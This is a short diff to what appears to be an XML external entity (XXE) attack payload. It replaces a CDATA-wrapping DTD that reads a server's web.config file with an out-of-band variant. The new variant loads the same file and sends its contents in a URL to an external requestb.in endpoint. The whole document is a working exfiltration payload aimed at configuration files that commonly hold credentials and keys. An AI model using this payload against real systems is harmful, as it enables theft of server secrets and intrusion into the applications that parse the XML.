@@ -1,4 +1,3 @@
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % goodies SYSTEM "file:///E:/approot/web.config">
-<!ENTITY % end "]]>">
-<!ENTITY % all "%start;%goodies;%end;">
+<!ENTITY % file SYSTEM "file:///E:/approot/web.config">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://requestb.in/10flcko1?%file;'>">
+%all;
